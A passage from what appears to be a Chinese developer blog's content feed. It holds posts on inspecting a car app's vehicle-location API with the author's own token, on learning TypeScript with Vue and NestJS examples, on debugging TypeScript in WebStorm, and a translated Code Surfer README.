是车架号码)</span>https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>carapp<span class="token punctuation">.</span>gtmc<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn<span class="token operator">/</span>api<span class="token operator">/</span>vhcApp<span class="token operator">/</span>lookForCar<span class="token operator">/</span>fixedPosition<span class="token operator">?</span>vin<span class="token operator">=</span><span class="token comment" spellcheck="true">// header </span>Authorization<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">{</span>jwt<span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>返回结构:</p><pre class=" language-js"><code class="language-js"><span class="token punctuation">{</span>    <span class="token string">"resultCode"</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span>    <span class="token string">"errMsg"</span><span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>    <span class="token string">"elapsedMilliseconds"</span><span class="token punctuation">:</span> <span class="token number">1009</span><span class="token punctuation">,</span>    <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token string">"remissId"</span><span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>        <span class="token string">"latitude"</span><span class="token punctuation">:</span> <span class="token string">"100"</span><span class="token punctuation">,</span>        <span class="token string">"being"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token string">"longitude"</span><span class="token punctuation">:</span> <span class="token string">"200"</span><span class="token punctuation">,</span>        <span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token string">"success"</span><span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span></code></pre><p>其中 latitude longitude 就是车辆的经纬度了.</p><h3 id="位置上报"><a href="#位置上报" class="headerlink" title="位置上报"></a>位置上报</h3><p>以上的信息似乎就可以获取车辆的位置信息,画出行驶轨迹了。</p><p>然后，我在车辆行驶中时候抓包时候，发现车辆的位置一直是上一次停车的那个点。推测，车辆位置并不是实时上报，而是车辆停止，熄火后上报一次，功能也只用来追踪车辆的最终停止位置。</p><h3 id="还能做什么"><a href="#还能做什么" class="headerlink" title="还能做什么"></a>还能做什么</h3><p>抓包研究的过程还是非常有意思的。虽然我们最初的结果没有达到，但是我们用这些数据依然可以做很多有意思的事情，比如用<code>flutter</code>把这些功能重写一遍？</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> promise </tag>
            
            <tag> axios </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typescript 该不该学？</title>
      <link href="/2020/06/02/front-end/learntypescript/"/>
      <url>/2020/06/02/front-end/learntypescript/</url>
      
        <content type="html"><![CDATA[<h1 id="引"><a href="#引" class="headerlink" title="引"></a>引</h1><p>all in js，编程语言的相互编译并不是复杂的问题，在<a href="https://github.com/jashkenas/coffeescript/wiki/List-of-languages-that-compile-to-JS" target="_blank" rel="noopener">github</a>上面可以看到大量的编译器，<code>java</code>，<code>ruby</code>，<code>python</code>，甚至远古的 <code>smallTalk</code>，<code>lisp</code>，都可以编译为<code> javascript</code>。</p><p><code>javascript</code> 的方言派系大致可以分成两派：</p><ol><li><code>CoffeeScript</code> ：由ruby社区创建的方言，<code>CoffeeScript</code> 吸收了 <code>Ruby</code>, <code>Python</code>, <code>Haskell</code> 语言的设计思想, 将 <code>JavaScript</code> 的代码变得清晰简洁, 盛极一时。</li><li>TypeScript 是 Microsoft 推出的编程语言, 项目由大名鼎鼎的 C# 首席架构师 Anders Hejlsberg 操刀. 它的特点是在 JavaScript 的基础上实现了强类型和静态类型检查, 加入了很多静态语言才有的概念。</li></ol><p><code>CoffeeScript </code>已然式微，Typescript 背靠微软这颗大树，在前端界掀起腥风血雨，知名的开源框架，<code>React</code>、<code>Vue</code>、<code>Angular</code>无不投入其怀抱，甚至<code>github</code>上面稍微用户多一点的类库，都会有 issue 提到是否提供 Typescript 的  <code>.d.ts</code> 文件（有这个文件，就提供了 <code>Typescript</code>的支持 ）。</p><p>官方说，<code>Typescript</code> 是<code>Javascript</code>的超集，似乎可以把他理解成基于 <code>Javascript</code> 的独立语言？我并不这么理解，<code>Typescript</code> 最终的执行宿主环境，还是v8引擎，它最终还是要编译成<code>JavaScript</code>。它的用户绝大部分也还是<code>JavaScript</code>用户，这些原因，使得它对新特性的添加非常克制，新特性几乎都可以在TC39（一个推动 JavaScript 发展的委员会，由各个主流浏览器厂商的代表构成，制定ECMAScript标准，标准生成的流程，并实现）中找到原型。</p><p><code>Typescript</code> 只不过是 <code>Beta</code> 版本的 <code>Javascript</code>。学不学完全不是问题了，现在不学，以后肯定还是要学:smile:。</p><h1 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h1><h3 id="一句-web端-（-基于-vue-和-Typescript-写法）"><a href="#一句-web端-（-基于-vue-和-Typescript-写法）" class="headerlink" title="一句 web端 （ 基于 vue 和 Typescript 写法）"></a><a href="https://word.aocoding.com/" target="_blank" rel="noopener">一句 web端</a> （ 基于 <code>vue</code> 和 Typescript 写法）</h3><pre class=" language-typescript"><code class="language-typescript"><span class="token operator">&lt;</span>script lang<span class="token operator">=</span><span class="token string">"ts"</span><span class="token operator">></span><span class="token comment" spellcheck="true">// class 组件写法</span><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> Vue <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue-property-decorator'</span><span class="token keyword">import</span> <span class="token punctuation">{</span> Mutation <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vuex-class'</span><span class="token keyword">import</span> <span class="token punctuation">{</span> message <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'ant-design-vue'</span><span class="token comment" spellcheck="true">// 装饰器</span>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">class</span> <span class="token class-name">IndexPage</span> <span class="token keyword">extends</span> <span class="token class-name">Vue</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 原data</span>  form <span class="token operator">=</span> <span class="token punctuation">{</span>    word<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>    <span class="token keyword">from</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>    source<span class="token punctuation">:</span> <span class="token string">''</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// vuex state</span> <span class="token comment" spellcheck="true">// ! 断言不为空，兼容写法（断言）</span>  <span class="token comment" spellcheck="true">//  由于Ts最新版本使用了strictPropertyInitialization，如果变量没有在构造函数中使用或赋值，都需要添加!，进行显式赋值断言</span>  @<span class="token function">Mutation</span><span class="token punctuation">(</span><span class="token string">'showloading'</span><span class="token punctuation">)</span> showloading<span class="token operator">!</span><span class="token punctuation">:</span> <span class="token keyword">boolean</span>  rules <span class="token operator">=</span> <span class="token punctuation">{</span>    word<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        required<span class="token punctuation">:</span> <span class="token keyword">true</span><span class="token punctuation">,</span>        message<span class="token punctuation">:</span> <span class="token string">'请输入内容'</span><span class="token punctuation">,</span>        whitespace<span class="token punctuation">:</span> <span class="token keyword">true</span><span class="token punctuation">,</span>        trigger<span class="token punctuation">:</span> <span class="token string">'blur'</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token keyword">from</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        required<span class="token punctuation">:</span> <span class="token keyword">true</span><span class="token punctuation">,</span>        message<span class="token punctuation">:</span> <span class="token string">'请输入来源'</span><span class="token punctuation">,</span>        whitespace<span class="token punctuation">:</span> <span class="token keyword">true</span><span class="token punctuation">,</span>        trigger<span class="token punctuation">:</span> <span class="token string">'blur'</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 兼容写法</span><span class="token comment" spellcheck="true">// nuxt 中$api被挂载到了this下面</span>  $api<span class="token punctuation">:</span> <span class="token keyword">any</span>  <span class="token comment" spellcheck="true">// 兼容写法</span>  <span class="token comment" spellcheck="true">// formRef 类型</span>  <span class="token comment" spellcheck="true">// 解释：https://stackoverflow.com/questions/52109471/typescript-in-vue-property-validate-does-not-exist-on-type-vue-element</span>  <span class="token keyword">get</span> <span class="token function">formRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> Vue <span class="token operator">&amp;</span> <span class="token punctuation">{</span> validate<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">boolean</span> <span class="token punctuation">}</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>form as Vue <span class="token operator">&amp;</span> <span class="token punctuation">{</span> validate<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">boolean</span> <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> async <span class="token function">onSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> self <span class="token operator">=</span> <span class="token keyword">this</span>    <span class="token keyword">const</span> verify<span class="token punctuation">:</span> <span class="token keyword">boolean</span> <span class="token operator">=</span> await <span class="token keyword">this</span><span class="token punctuation">.</span>formRef<span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>verify<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> code<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> data <span class="token punctuation">}</span> <span class="token operator">=</span> await self<span class="token punctuation">.</span>$api<span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">{</span>          <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>form        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          message<span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token string">'添加成功'</span><span class="token punctuation">)</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>form <span class="token operator">=</span> <span class="token punctuation">{</span>            word<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>            <span class="token keyword">from</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>            source<span class="token punctuation">:</span> <span class="token string">''</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>          message<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>github:    <a href="https://github.com/justOneWord/one_word_web" target="_blank" rel="noopener">https://github.com/justOneWord/one_word_web</a></p><p>个人感受：</p><ol><li>传统vue组件写法过度为<code>vue-class-component</code>写法，改变比较大，使用装饰器代替传统的代码组织形式。</li><li>因为对Typescript的支持不完善，需要写部分兼容代码。</li><li>前端的代码类库提供的类型定义文件不完善，很多类库都没有提供，部分表态在vue3之后提供。现阶段可能需要手动声明为any使用。</li></ol><h3 id="一句服务端-（基于-nest-js-和-typescript-写法）"><a href="#一句服务端-（基于-nest-js-和-typescript-写法）" class="headerlink" title="一句服务端 （基于 nest.js 和 typescript 写法）"></a>一句服务端 （基于 nest.js 和 typescript 写法）</h3><p><code>wordController</code>(部分)：</p><p>大量使用装饰器语法，简化写法</p><pre class=" language-typescript"><code class="language-typescript"><span class="token comment" spellcheck="true">// 装饰器</span>@<span class="token function">Controller</span><span class="token punctuation">(</span><span class="token string">'word'</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">WordController</span> <span class="token punctuation">{</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token keyword">private</span> readonly wordService<span class="token punctuation">:</span>WordService<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 三个装饰器</span>  @<span class="token function">Post</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 参数校验管道</span>  @<span class="token function">UsePipes</span><span class="token punctuation">(</span>ValidationPipe<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 手动返回200，否则会返回201，也可以放到全局拦截器去做</span>  @<span class="token function">HttpCode</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// body 类型 WordDto</span>  async <span class="token function">add</span><span class="token punctuation">(</span>@<span class="token function">Body</span><span class="token punctuation">(</span><span class="token punctuation">)</span> body<span class="token punctuation">:</span> WordDto<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span>   await <span class="token keyword">this</span><span class="token punctuation">.</span>wordService<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  @<span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">'random'</span><span class="token punctuation">)</span>  random <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>wordService<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><code>wordService</code>（部分）:</p><pre class=" language-typescript"><code class="language-typescript"><span class="token keyword">constructor</span><span class="token punctuation">(</span>    <span class="token comment" spellcheck="true">// 注入 redis</span>    <span class="token keyword">private</span> readonly redisService<span class="token punctuation">:</span> RedisService<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// 数据库注入</span>    @<span class="token function">InjectRepository</span><span class="token punctuation">(</span>Word<span class="token punctuation">)</span> <span class="token keyword">private</span> readonly wordReposition<span class="token punctuation">:</span> Repository<span class="token operator">&lt;</span>Word<span class="token operator">></span><span class="token punctuation">,</span>    @<span class="token function">InjectRepository</span><span class="token punctuation">(</span>Hitoapi<span class="token punctuation">)</span>    <span class="token keyword">private</span> readonly hitoApiReposition<span class="token punctuation">:</span> Repository<span class="token operator">&lt;</span>Hitoapi<span class="token operator">></span><span class="token punctuation">,</span>  <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 指定 body 类型为 `WordDto`</span>async <span class="token function">add</span><span class="token punctuation">(</span>body<span class="token punctuation">:</span> WordDto<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 查找是否存在</span>    <span class="token comment" spellcheck="true">// result 会自动推导出类型，不需要手动指定</span>    <span class="token keyword">const</span> result <span class="token operator">=</span> await <span class="token keyword">this</span><span class="token punctuation">.</span>wordReposition<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">{</span> word<span class="token punctuation">:</span> body<span class="token punctuation">.</span>word <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ApiCode 代码提示，也是Typescript提供的能力</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ApiException</span><span class="token punctuation">(</span><span class="token string">'资源已经存在'</span><span class="token punctuation">,</span> ApiCode<span class="token punctuation">.</span>EXIST_ERROR<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> newWord <span class="token operator">=</span> await <span class="token keyword">this</span><span class="token punctuation">.</span>wordReposition<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      <span class="token operator">...</span>body<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'newWord'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> newResult <span class="token operator">=</span> await <span class="token keyword">this</span><span class="token punctuation">.</span>wordReposition<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>newWord<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newResult<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">//  插入成功</span>      <span class="token keyword">return</span> <span class="token keyword">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ApiException</span><span class="token punctuation">(</span><span class="token string">'添加失败'</span><span class="token punctuation">,</span> ApiCode<span class="token punctuation">.</span>BUSINESS_ERROR<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>github: <a href="https://github.com/justOneWord/one_word_api" target="_blank" rel="noopener">https://github.com/justOneWord/one_word_api</a></p><p>个人感受：</p><ol><li><code>nestjs</code> 框架基于 Typescript 开发，整体使用行云流水，没有为了用Typescript而用Typescript的感觉。</li><li>代码层次清晰，具有完善的 mvc 结构，比<code>express</code>方便。</li></ol><p>参考文档：</p><ol><li><p><a href="https://www.blackglory.me/javascript-dialects-and-factions/" target="_blank" rel="noopener">漫谈 JavaScript 方言与派系</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/139731168" target="_blank" rel="noopener">前端开发的瓶颈与未来之路</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typescript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webstorm 中调试typescript单文件</title>
      <link href="/2020/05/22/front-end/debugger-typescript-in-webstorm/"/>
      <url>/2020/05/22/front-end/debugger-typescript-in-webstorm/</url>
      
        <content type="html"><![CDATA[<p>leetCode 最近支持了<code>typescript</code>刷题，高高兴兴把<code>webstorm</code>切换到typescript刷题,记录下切换过程。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>因为刷题都是单文件，我们需要用webstorm支持debugger单ts文件。</p><p><code>yarn add typescript ts-node</code>  ts-node 可以让我们直接执行ts文件</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ol><li>配置部分 Node parameters 填写：<code>--require ts-node/register</code>。</li><li>点击运行，就可以直接执行<code>.ts</code>单文件，点击debugger就可以进行<code>debugger</code>了，和以前调试js一样，非常方便</li></ol><p><img src="/images/image-20200522110323174.png" alt="配置"></p><p><img src="/images/image-20200522110831517.png" alt="运行"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typescript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>code-surfer 中文翻译</title>
      <link href="/2020/05/12/translation/code-surfer-zh/"/>
      <url>/2020/05/12/translation/code-surfer-zh/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/pomber/code-surfer" target="_blank" rel="noopener">code-surfer</a>  炫酷的代码演示ppt。</p><p>用起来还是有些小毛病，比如无法居中，要手动条件，但是瑕不掩瑜，这是一款非常棒的软件。</p><p>顺手做了个翻译，已提到官方库。</p><p>和博客的渲染有点冲突，移步官方库，地址：<a href="https://github.com/pomber/code-surfer/blob/master/readme-zh.md" target="_blank" rel="noopener">https://github.com/pomber/code-surfer/blob/master/readme-zh.md</a></p><hr><h1 id="Code-Surfer"><a href="#Code-Surfer" class="headerlink" title="Code Surfer"></a>Code Surfer</h1><blockquote><p>在 <a href="https://opencollective.com/code-surfer" target="_blank" rel="noopener">support</a>  上赞助这个项目，保持她的生命力❤️</p></blockquote><p>Code Surfer为 <a href="https://github.com/jxnblk/mdx-deck" target="_blank" rel="noopener">MDX Deck</a> 幻灯片增加代码高亮、代码缩放、代码滚动、代码聚焦、代码变形等功能。</p><p>创建并运行一个新的项目:</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> init code-surfer-deck my-deck<span class="token function">cd</span> my-deck<span class="token function">npm</span> start</code></pre><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li><a href="https://advanced-graphql-workshop.netlify.com/" target="_blank" rel="noopener">强大的GraphQL工作坊</a> 作者 <a href="https://twitter.com/_philpl" target="_blank" rel="noopener">Phil Pluckthun</a></li><li><a href="https://github.com/pomber/react-conf-2018-hooks-demo" target="_blank" rel="noopener">React Conf 2018 Hooks Demo</a></li></ul><h2 id="如何使用-Code-Surfer"><a href="#如何使用-Code-Surfer" class="headerlink" title="如何使用 Code Surfer"></a>如何使用 Code Surfer</h2><blockquote><p>首先了解 <a href="https://github.com/jxnblk/mdx-deck" target="_blank" rel="noopener">MDX Deck</a> 的工作方式可能会有所帮助</p></blockquote><p>要使用 Code Surfer，你需要先将其导入，并使用 <code>&lt;CodeSurfer&gt;</code> 标签包裹要显示的代码（<strong>需要在代码块之前和之后保留空行</strong>）:</p><pre class=" language-markdown"><code class="language-markdown">import { CodeSurfer } from "code-surfer"<span class="token title important"><span class="token punctuation">#</span> Deck Title</span><span class="token hr punctuation">---</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CodeSurfer</span><span class="token punctuation">></span></span>​```jsconsole.log(1);console.log(2);console.log(3);```<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CodeSurfer</span><span class="token punctuation">></span></span></code></pre><p>特性:</p><ul><li><a href="#focus">高亮</a></li><li><a href="#steps">步骤</a></li><li><a href="#title-and-subtitle">标题和副标题</a></li><li><a href="#themes">主题</a></li><li><a href="#custom-styles">自定义样式</a></li><li><a href="#languages">多语言支持</a></li><li><a href="#columns">列</a></li><li><a href="#import-code">导入代码</a></li><li><a href="#line-numbers">行号</a></li><li><a href="#diffs">差异</a></li></ul><blockquote><p>这是一个 <a href="https://codesurfer.pomb.us/full/" target="_blank" rel="noopener">使用所有功能</a> (及 <a href="https://raw.githubusercontent.com/pomber/code-surfer/code-surfer-v2/sites/docs/decks/full.mdx" target="_blank" rel="noopener">mdx 源码</a>)的演示文稿，万一你更喜欢阅读代码而不是文档😀</p></blockquote><h2 id="高亮"><a href="#高亮" class="headerlink" title="高亮"></a>高亮</h2><p>在代码块第一行中的（设置）语言之后添加 _高亮字符串位置_，以告诉Code Surfer你要高亮的行和列。</p><p>Code Surfer将淡出所有未高亮的代码，并在必要时将其缩小以适合幻灯片。</p><p>​````md<br><CodeSurfer></p><p>​```js 1:2,3[8:10]<br>console.log(1);<br>console.log(2);<br>console.log(3);</p><pre><code>&lt;/CodeSurfer&gt;</code></pre><p>在上面的示例中，<code>1:2,3[8:10]</code> 意思是：“行1行2高亮，行3到列8到10高亮”。更多示例：</p><ul><li><code>5:10</code> 第 5,6,7,8,9 行 和第 10 行高亮</li><li><code>1,3:5,7</code> 第1行，第 3~5 行，第 7 行高亮，</li><li><code>2[5]</code> 第 2 行第5高亮</li><li><code>2[5:8]</code> 第 2 行 5~8 列高亮</li><li><code>1,2[1,3:5,7],3</code> 第1行，第2行，第2行第1列、3~5列、7列高亮</li></ul><p><em>注意: 在以前的CodeSurfer版本中，我们使用标记代替列。</em></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>添加更多代码块，以向 Code Surfer 幻灯片添加步骤。</p><p>​````md<br><CodeSurfer></p><p>​```js<br>console.log(1);<br>console.log(2);<br>console.log(3);</p><pre><code>```js 1console.log(1);console.log(2);console.log(3);</code></pre><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></CodeSurfer>````<p>你可以为不同的步骤更改焦点和/或代码，然后 Code Surfer 会在以下步骤之间进行变换：缩放，滚动，淡入，淡出，添加和删除行。</p><h2 id="标题和副标题"><a href="#标题和副标题" class="headerlink" title="标题和副标题"></a>标题和副标题</h2><p>​````md<br><CodeSurfer></p><p>​```js 1 title=”Title” subtitle=”Look at the first line”<br>console.log(1);<br>console.log(2);<br>console.log(3);</p><pre><code>```js 2 title=&quot;Title&quot; subtitle=&quot;and now the second&quot;console.log(1);console.log(2);console.log(3);</code></pre></CodeSurfer>````<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p><a href="https://codesurfer.pomb.us/themes/" target="_blank" rel="noopener"><img src="https://user-images.githubusercontent.com/1911623/66016573-97df9c00-e4ad-11e9-9095-225d5c9b46a8.png" alt="Code Surfer Themes"></a></p><p>在 <a href="https://github.com/pomber/code-surfer/blob/code-surfer-v2/packs/themes/src/index.ts" target="_blank" rel="noopener"><code>@code-surfer/themes</code></a> 包里面有许多Code Surfer主题。</p><p>你可以通过 theme 传递 prop <code>&lt;CodeSurfer theme={someTheme}&gt;</code>:</p><p>​````md<br>import { CodeSurfer } from “code-surfer”<br>import { nightOwl } from “@code-surfer/themes”</p><CodeSurfer theme={nightOwl}><p>​```js<br>console.log(1);<br>console.log(2);<br>console.log(3);</p><pre><code>&lt;/CodeSurfer&gt;</code></pre><p>或者像设置其他任何<a href="https://github.com/jxnblk/mdx-deck#theming" target="_blank" rel="noopener">MDX Deck 主题</a>一样设置整个项目的主题：</p><p>​````md<br>import { CodeSurfer } from “code-surfer”<br>import { nightOwl } from “@code-surfer/themes”</p><p>export const theme = nightOwl</p><CodeSurfer><p>​```js<br>console.log(1);<br>console.log(2);<br>console.log(3);</p><pre><code>&lt;/CodeSurfer&gt;</code></pre><blockquote><p>以这种方式导出主题还将更改未使用Code Surfer的幻灯片的文本和背景颜色。如果要保留其他mdx主题的颜色，可以将<a href="https://github.com/jxnblk/mdx-deck/blob/master/docs/theming.md#composing-themes" target="_blank" rel="noopener">两个主题组合在一起</a>：<code>export const themes = [codeSurferTheme, mdxDeckTheme]</code></p></blockquote><h2 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h2><p>你可以编写自己的Code Surfer主题，更改代码，标题和副标题的样式：</p><blockquote><p>在主题中使用 <a href="https://theme-ui.com/" target="_blank" rel="noopener">Theme UI</a></p></blockquote><p>​```js<br>// custom-theme.js<br>export default {<br>  colors: {<br>    background: “#222”,<br>    text: “#ddd”,<br>    primary: “#a66”<br>  },<br>  styles: {<br>    CodeSurfer: {<br>      pre: {<br>        color: “text”,<br>        backgroundColor: “background”<br>      },<br>      code: {<br>        color: “text”,<br>        backgroundColor: “background”<br>      },<br>      tokens: {<br>        “comment cdata doctype”: {<br>          fontStyle: “italic”<br>        },<br>        “builtin changed keyword punctuation operator tag deleted string attr-value char number inserted”: {<br>          color: “primary”<br>        },<br>        “line-number”: {<br>          opacity: 0.8<br>        }<br>      },<br>      title: {<br>        backgroundColor: “background”,<br>        color: “text”<br>      },<br>      subtitle: {<br>        color: “#d6deeb”,<br>        backgroundColor: “rgba(10,10,10,0.9)”<br>      },<br>      unfocused: {<br>        // only the opacity of unfocused code can be changed<br>        opacity: 0.1<br>      }<br>    }<br>  }<br>};</p><pre><code>像其他卡片主题一样使用它:````mdimport { CodeSurfer } from &quot;code-surfer&quot;import customTheme from &quot;./custom-theme&quot;&lt;CodeSurfer theme={customTheme}&gt;​```jsconsole.log(1);console.log(2);console.log(3);</code></pre></CodeSurfer>````<h2 id="语言支持"><a href="#语言支持" class="headerlink" title="语言支持"></a>语言支持</h2><p>Code Surfer 使用 <a href="https://prismjs.com/" target="_blank" rel="noopener">Prism</a> 解析不同的语言, 因此它支持 <a href="https://prismjs.com/#supported-languages" target="_blank" rel="noopener">Prism 支持的所有语言</a>.</p><p>开箱即用的支持大多数流行语言，其余的则需要导入它们:</p><p>​````md<br>import { CodeSurfer } from “code-surfer”<br>import 